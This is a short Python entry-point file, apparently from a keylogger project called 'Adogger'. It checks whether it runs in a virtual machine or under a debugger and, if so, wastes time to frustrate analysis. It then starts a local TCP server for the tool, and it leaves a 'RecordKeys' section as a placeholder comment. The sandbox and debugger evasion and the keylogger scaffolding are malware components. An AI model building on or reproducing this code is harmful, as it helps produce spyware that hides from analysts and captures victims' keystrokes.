import socketserver

from sys import stdout

from EstablishConnection import AdoggerServer
from RunningEnvironment import RunningEnvironment
from WasteTime import WasteTime

def main():
    ################################################################
    # Check if program is running in a virtual machine or a debugger
    ################################################################
    runEnv = RunningEnvironment()
    runEnv.checkVM()
    runEnv.checkDebugger()

    if runEnv.isCompromised:
        # Perform useless operations
        WasteTime.run()

    ################################################################
    # Start Server
    ################################################################
    HOST, PORT = "localhost", 9999
    with socketserver.TCPServer((HOST, PORT), AdoggerServer) as server:
        server.serve_forever()

    ################################################################
    # RecordKeys
    ################################################################

    return

if __name__ == "__main__":
    main()
